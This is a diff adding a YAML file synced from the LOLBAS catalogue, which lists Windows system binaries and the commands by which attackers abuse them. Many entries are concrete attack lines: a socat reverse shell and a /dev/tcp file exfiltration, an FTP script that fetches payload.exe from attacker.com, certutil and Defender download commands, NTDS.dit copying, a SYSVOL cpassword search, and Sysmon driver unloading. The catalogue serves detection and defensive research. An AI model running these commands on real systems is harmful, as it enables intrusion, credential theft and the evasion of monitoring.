@@ -1,0 +1,2262 @@
+version: 1
+kind: synced_source
+source: lolbas-project
+url: https://lolbas-project.github.io/api/lolbas.json
+fetched: '2026-09-14'
+count: 245
+entries:
+- binary: AddinUtil.exe
+  description: .NET Tool used for updating cache files for Microsoft Office Add-Ins.
+  commands:
+  - C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe -AddinRoot:.
+  paths:
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AddinUtil.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddinUtil.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\AddInUtil.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\AddInUtil.exe''}'
+  attack: []
+- binary: AppInstaller.exe
+  description: Tool used for installation of AppX/MSIX applications on Windows 10
+  commands:
+  - start ms-appinstaller://?source={REMOTEURL:.exe}
+  paths:
+  - '{''Path'': ''C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\\AppInstaller.exe''}'
+  attack: []
+- binary: Applaunch.exe
+  description: Microsoft .NET ClickOnce Launch Utility.
+  commands:
+  - '"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Applaunch.exe" /activate "{REMOTEURL}#APPLICATION_METADATA_HERE"'
+  paths:
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Applaunch.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\Applaunch.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Applaunch.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Applaunch.exe''}'
+  attack: []
+- binary: Aspnet_Compiler.exe
+  description: ASP.NET Compilation Tool
+  commands:
+  - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\users\cpl.internal\desktop\asptest\ -f C:\users\cpl.internal\desktop\asptest\none -u
+  paths:
+  - '{''Path'': ''c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_compiler.exe''}'
+  - '{''Path'': ''c:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe''}'
+  attack: []
+- binary: At.exe
+  description: Schedule periodic tasks
+  commands:
+  - C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}
+  paths:
+  - '{''Path'': ''C:\\WINDOWS\\System32\\At.exe''}'
+  - '{''Path'': ''C:\\WINDOWS\\SysWOW64\\At.exe''}'
+  attack: []
+- binary: Atbroker.exe
+  description: Helper binary for Assistive Technology (AT)
+  commands:
+  - ATBroker.exe /start malware
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\Atbroker.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\Atbroker.exe''}'
+  attack: []
+- binary: Bash.exe
+  description: File used by Windows subsystem for Linux
+  commands:
+  - bash.exe -c "{CMD}"
+  - bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"
+  - bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24'
+  - bash.exe -c "{CMD}"
+  - bash.exe
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\bash.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\bash.exe''}'
+  attack: []
+- binary: Bitsadmin.exe
+  description: Used for managing background intelligent transfer
+  commands:
+  - bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1
+  - bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+  - bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset
+  - bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\bitsadmin.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\bitsadmin.exe''}'
+  attack: []
+- binary: CertOC.exe
+  description: Used for installing certificates
+  commands:
+  - certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}
+  - certoc.exe -GetCACAPS {REMOTEURL:.ps1}
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\certoc.exe''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\certoc.exe''}'
+  attack: []
+- binary: CertReq.exe
+  description: Used for requesting and managing certificates
+  commands:
+  - CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}
+  - CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\certreq.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\certreq.exe''}'
+  attack: []
+- binary: Certutil.exe
+  description: Windows binary used for handling certificates
+  commands:
+  - certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}
+  - certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe}
+  - certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt
+  - certutil.exe -URL {REMOTEURL:.exe}
+  - certutil -encode {PATH} {PATH:.base64}
+  - certutil -decode {PATH:.base64} {PATH}
+  - certutil -decodehex {PATH:.hex} {PATH}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\certutil.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\certutil.exe''}'
+  attack: []
+- binary: Change.exe
+  description: Remote Desktop Services MultiUser Change Utility
+  commands:
+  - change.exe user
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\change.exe''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\change.exe''}'
+  attack: []
+- binary: Cipher.exe
+  description: File Encryption Utility
+  commands:
+  - cipher /w:{PATH_ABSOLUTE:folder}
+  - cipher.exe /e {PATH_ABSOLUTE}
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\cipher.exe''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\cipher.exe''}'
+  attack: []
+- binary: Cmd.exe
+  description: The command-line interpreter in Windows
+  commands:
+  - cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat
+  - cmd.exe - < {PATH}:payload.bat
+  - type {PATH_SMB} > {PATH_ABSOLUTE}
+  - type {PATH_ABSOLUTE} > {PATH_SMB}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\cmd.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\cmd.exe''}'
+  attack: []
+- binary: Cmdkey.exe
+  description: creates, lists, and deletes stored user names and passwords or credentials.
+  commands:
+  - cmdkey /list
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\cmdkey.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\cmdkey.exe''}'
+  attack: []
+- binary: cmdl32.exe
+  description: Microsoft Connection Manager Auto-Download
+  commands:
+  - cmdl32 /vpn /lan %cd%\config
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\cmdl32.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\cmdl32.exe''}'
+  attack: []
+- binary: Cmstp.exe
+  description: Installs or removes a Connection Manager service profile.
+  commands:
+  - cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}
+  - cmstp.exe /ni /s {REMOTEURL:.inf}
+  - cmstp.exe /nf
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\cmstp.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\cmstp.exe''}'
+  attack: []
+- binary: Colorcpl.exe
+  description: Binary that handles color management
+  commands:
+  - colorcpl {PATH}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\colorcpl.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\colorcpl.exe''}'
+  attack: []
+- binary: ComputerDefaults.exe
+  description: ComputerDefaults.exe is a Windows system utility for managing default applications for tasks like web browsing, emailing, and media playback.
+  commands:
+  - ComputerDefaults.exe
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\ComputerDefaults.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\ComputerDefaults.exe''}'
+  attack: []
+- binary: ConfigSecurityPolicy.exe
+  description: Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.
+  commands:
+  - ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}
+  - ConfigSecurityPolicy.exe {REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Windows Defender\\ConfigSecurityPolicy.exe''}'
+  - '{''Path'': ''C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\ConfigSecurityPolicy.exe''}'
+  attack: []
+- binary: Conhost.exe
+  description: Console Window host
+  commands:
+  - conhost.exe {CMD}
+  - conhost.exe --headless {CMD}
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\conhost.exe''}'
+  attack: []
+- binary: Control.exe
+  description: Binary used to launch controlpanel items in Windows
+  commands:
+  - control.exe {PATH_ABSOLUTE}:evil.dll
+  - control.exe {PATH_ABSOLUTE:.cpl}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\control.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\control.exe''}'
+  attack: []
+- binary: Csc.exe
+  description: Binary file used by .NET Framework to compile C# code
+  commands:
+  - csc.exe -out:{PATH:.exe} {PATH:.cs}
+  - csc -target:library {PATH:.cs}
+  paths:
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Csc.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Csc.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\csc.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\csc.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\csc.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\csc.exe''}'
+  attack: []
+- binary: Cscript.exe
+  description: Binary used to execute scripts in Windows
+  commands:
+  - cscript //e:vbscript {PATH_ABSOLUTE}:script.vbs
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\cscript.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\cscript.exe''}'
+  attack: []
+- binary: CustomShellHost.exe
+  description: A host process that is used by custom shells when using Windows in Kiosk mode.
+  commands:
+  - CustomShellHost.exe
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\CustomShellHost.exe''}'
+  attack: []
+- binary: DataSvcUtil.exe
+  description: DataSvcUtil.exe is a command-line tool provided by WCF Data Services that consumes an Open Data Protocol (OData) feed and generates the client data service classes that are needed to access a data service from a .NET Framework client application.
+  commands:
+  - DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\DataSvcUtil.exe''}'
+  attack: []
+- binary: Desktopimgdownldr.exe
+  description: Windows binary used to configure lockscreen/desktop image
+  commands:
+  - set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\desktopimgdownldr.exe''}'
+  attack: []
+- binary: DeviceCredentialDeployment.exe
+  description: Device Credential Deployment
+  commands:
+  - DeviceCredentialDeployment
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\DeviceCredentialDeployment.exe''}'
+  attack: []
+- binary: Dfsvc.exe
+  description: ClickOnce engine in Windows used by .NET
+  commands:
+  - rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Dfsvc.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\Dfsvc.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Dfsvc.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Dfsvc.exe''}'
+  attack: []
+- binary: Diantz.exe
+  description: Binary that package existing files into a cabinet (.cab) file
+  commands:
+  - diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab
+  - diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}
+  - diantz /f {PATH:.ddf}
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\diantz.exe''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\diantz.exe''}'
+  attack: []
+- binary: Diskshadow.exe
+  description: Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).
+  commands:
+  - diskshadow.exe /s {PATH:.txt}
+  - diskshadow> exec {PATH:.exe}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\diskshadow.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\diskshadow.exe''}'
+  attack: []
+- binary: Dnscmd.exe
+  description: A command-line interface for managing DNS servers
+  commands:
+  - dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\Dnscmd.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\Dnscmd.exe''}'
+  attack: []
+- binary: Esentutl.exe
+  description: Binary for working with Microsoft Joint Engine Technology (JET) database
+  commands:
+  - esentutl.exe /y {PATH_ABSOLUTE:.source.vbs} /d {PATH_ABSOLUTE:.dest.vbs} /o
+  - esentutl.exe /y {PATH_ABSOLUTE:.exe} /d {PATH_ABSOLUTE}:file.exe /o
+  - esentutl.exe /y {PATH_ABSOLUTE}:file.exe /d {PATH_ABSOLUTE:.exe} /o
+  - esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o
+  - esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o
+  - esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d {PATH_ABSOLUTE:.dit}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\esentutl.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\esentutl.exe''}'
+  attack: []
+- binary: Eudcedit.exe
+  description: Private Character Editor Windows Utility
+  commands:
+  - eudcedit
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\eudcedit.exe''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\eudcedit.exe''}'
+  attack: []
+- binary: Eventvwr.exe
+  description: Displays Windows Event Logs in a GUI window.
+  commands:
+  - eventvwr.exe
+  - ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c "{CMD}" > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\eventvwr.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\eventvwr.exe''}'
+  attack: []
+- binary: Expand.exe
+  description: Binary that expands one or more compressed files
+  commands:
+  - expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat}
+  - expand {PATH_ABSOLUTE:.source.ext} {PATH_ABSOLUTE:.dest.ext}
+  - expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\Expand.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\Expand.exe''}'
+  attack: []
+- binary: Explorer.exe
+  description: Binary used for managing files and system components within Windows
+  commands:
+  - explorer.exe /root,"{PATH_ABSOLUTE:.exe}"
+  - explorer.exe {PATH_ABSOLUTE:.exe}
+  paths:
+  - '{''Path'': ''C:\\Windows\\explorer.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\explorer.exe''}'
+  attack: []
+- binary: Extexport.exe
+  description: Load a DLL located in the c:\test folder with a specific name.
+  commands:
+  - Extexport.exe {PATH_ABSOLUTE:folder} foo bar
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Internet Explorer\\Extexport.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Internet Explorer\\Extexport.exe''}'
+  attack: []
+- binary: Extrac32.exe
+  description: Extract to ADS, copy or overwrite a file with Extrac32.exe
+  commands:
+  - extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe
+  - extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe
+  - extrac32 /Y /C {PATH_SMB} {PATH_ABSOLUTE}
+  - extrac32.exe /C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\extrac32.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\extrac32.exe''}'
+  attack: []
+- binary: Findstr.exe
+  description: Write to ADS, discover, or download files with Findstr.exe
+  commands:
+  - findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe
+  - findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe
+  - findstr /S /I cpassword \\sysvol\policies\*.xml
+  - findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\findstr.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\findstr.exe''}'
+  attack: []
+- binary: Finger.exe
+  description: Displays information about a user or users on a specified remote computer that is running the Finger service or daemon
+  commands:
+  - finger user@example.host.com | more +2 | cmd
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\finger.exe''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\finger.exe''}'
+  attack: []
+- binary: fltMC.exe
+  description: Filter Manager Control Program used by Windows
+  commands:
+  - fltMC.exe unload SysmonDrv
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\fltMC.exe''}'
+  attack: []
+- binary: Forfiles.exe
+  description: Selects and executes a command on a file or set of files. This command is useful for batch processing.
+  commands:
+  - forfiles /p c:\windows\system32 /m notepad.exe /c "{CMD}"
+  - forfiles /p c:\windows\system32 /m notepad.exe /c "{PATH_ABSOLUTE}:evil.exe"
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\forfiles.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\forfiles.exe''}'
+  attack: []
+- binary: Fsutil.exe
+  description: File System Utility
+  commands:
+  - fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE}
+  - 'fsutil.exe usn deletejournal /d c:'
+  - fsutil.exe trace decode
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\fsutil.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\fsutil.exe''}'
+  attack: []
+- binary: Ftp.exe
+  description: A binary designed for connecting to FTP servers
+  commands:
+  - echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt
+  - cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\ftp.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\ftp.exe''}'
+  attack: []
+- binary: Gpscript.exe
+  description: Used by group policy to process scripts
+  commands:
+  - Gpscript /logon
+  - Gpscript /startup
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\gpscript.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\gpscript.exe''}'
+  attack: []
+- binary: Hh.exe
+  description: Binary used for processing chm files in Windows
+  commands:
+  - HH.exe {REMOTEURL:.bat}
+  - HH.exe {PATH_ABSOLUTE:.exe}
+  - HH.exe {REMOTEURL:.chm}
+  paths:
+  - '{''Path'': ''C:\\Windows\\hh.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\hh.exe''}'
+  attack: []
+- binary: IMEWDBLD.exe
+  description: Microsoft IME Open Extended Dictionary Module
+  commands:
+  - C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\IME\\SHARED\\IMEWDBLD.exe''}'
+  attack: []
+- binary: Ie4uinit.exe
+  description: Executes commands from a specially prepared ie4uinit.inf file.
+  commands:
+  - ie4uinit.exe -BaseSettings
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\ie4uinit.exe''}'
+  - '{''Path'': ''c:\\windows\\sysWOW64\\ie4uinit.exe''}'
+  - '{''Path'': ''c:\\windows\\system32\\ieuinit.inf''}'
+  - '{''Path'': ''c:\\windows\\sysWOW64\\ieuinit.inf''}'
+  attack: []
+- binary: iediagcmd.exe
+  description: Diagnostics Utility for Internet Explorer
+  commands:
+  - set windir=c:\test& cd "C:\Program Files\Internet Explorer\" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Internet Explorer\\iediagcmd.exe''}'
+  attack: []
+- binary: Ieexec.exe
+  description: The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.
+  commands:
+  - ieexec.exe {REMOTEURL:.exe}
+  - ieexec.exe {REMOTEURL:.exe}
+  paths:
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\ieexec.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\ieexec.exe''}'
+  attack: []
+- binary: Ilasm.exe
+  description: used for compile c# code into dll or exe.
+  commands:
+  - ilasm.exe {PATH_ABSOLUTE:.txt} /exe
+  - ilasm.exe {PATH_ABSOLUTE:.txt} /dll
+  paths:
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ilasm.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ilasm.exe''}'
+  attack: []
+- binary: Infdefaultinstall.exe
+  description: Binary used to perform installation based on content inside inf files
+  commands:
+  - InfDefaultInstall.exe {PATH:.inf}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\Infdefaultinstall.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\Infdefaultinstall.exe''}'
+  attack: []
+- binary: Installutil.exe
+  description: The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies
+  commands:
+  - InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
+  - InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
+  - InstallUtil.exe {REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\InstallUtil.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\InstallUtil.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe''}'
+  attack: []
+- binary: iscsicpl.exe
+  description: Microsoft iSCSI Initiator Control Panel tool
+  commands:
+  - c:\windows\syswow64\iscsicpl.exe
+  - iscsicpl.exe
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\iscsicpl.exe''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\iscsicpl.exe''}'
+  attack: []
+- binary: Jsc.exe
+  description: Binary file used by .NET to compile JavaScript code to .exe or .dll format
+  commands:
+  - jsc.exe {PATH:.js}
+  - jsc.exe /t:library {PATH:.js}
+  paths:
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Jsc.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Jsc.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Jsc.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\Jsc.exe''}'
+  attack: []
+- binary: Ldifde.exe
+  description: Creates, modifies, and deletes LDAP directory objects.
+  commands:
+  - Ldifde -i -f {PATH:.ldf}
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\ldifde.exe''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\ldifde.exe''}'
+  attack: []
+- binary: Makecab.exe
+  description: Binary to package existing files into a cabinet (.cab) file
+  commands:
+  - makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab
+  - makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab
+  - makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}
+  - makecab /F {PATH:.ddf}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\makecab.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\makecab.exe''}'
+  attack: []
+- binary: Mavinject.exe
+  description: Used by App-v in Windows
+  commands:
+  - MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll}
+  - Mavinject.exe 4172 /INJECTRUNNING {PATH_ABSOLUTE}:file.dll
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\mavinject.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\mavinject.exe''}'
+  attack: []
+- binary: Microsoft.Workflow.Compiler.exe
+  description: A utility included with .NET that is capable of compiling and executing C# or VB.net code.
+  commands:
+  - Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}
+  - Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}
+  - Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}
+  paths:
+  - '{''Path'': ''C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe''}'
+  attack: []
+- binary: Mmc.exe
+  description: Load snap-ins to locally and remotely manage Windows systems
+  commands:
+  - mmc.exe -Embedding {PATH_ABSOLUTE:.msc}
+  - mmc.exe gpedit.msc
+  - mmc.exe -Embedding {PATH_ABSOLUTE:.msc}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\mmc.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\mmc.exe''}'
+  attack: []
+- binary: Mofcomp.exe
+  description: Compiler that parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository. Threat actors can leverage this binary to install malicious MOF scripts
+  commands:
+  - mofcomp.exe {PATH_ABSOLUTE:.mof}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\wbem\\mofcomp.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\wbem\\mofcomp.exe''}'
+  attack: []
+- binary: MpCmdRun.exe
+  description: Binary part of Windows Defender. Used to manage settings in Windows Defender
+  commands:
+  - MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}
+  - copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\Downloads\MP.exe && chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\" && "C:\Users\Public\Downloads\MP.exe" -DownloadFile -url {REMOTEURL:.exe} -path C:\Users\Public\Downloads\evil.exe
+  - MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe
+  paths:
+  - '{''Path'': ''C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.4-0\\MpCmdRun.exe''}'
+  - '{''Path'': ''C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.7-0\\MpCmdRun.exe''}'
+  - '{''Path'': ''C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Windows Defender\\MpCmdRun.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Defender\\MpCmdRun.exe''}'
+  - '{''Path'': ''C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.23110.3-0\\X86\\MpCmdRun.exe''}'
+  attack: []
+- binary: Msbuild.exe
+  description: Used to compile and execute code
+  commands:
+  - msbuild.exe {PATH:.xml}
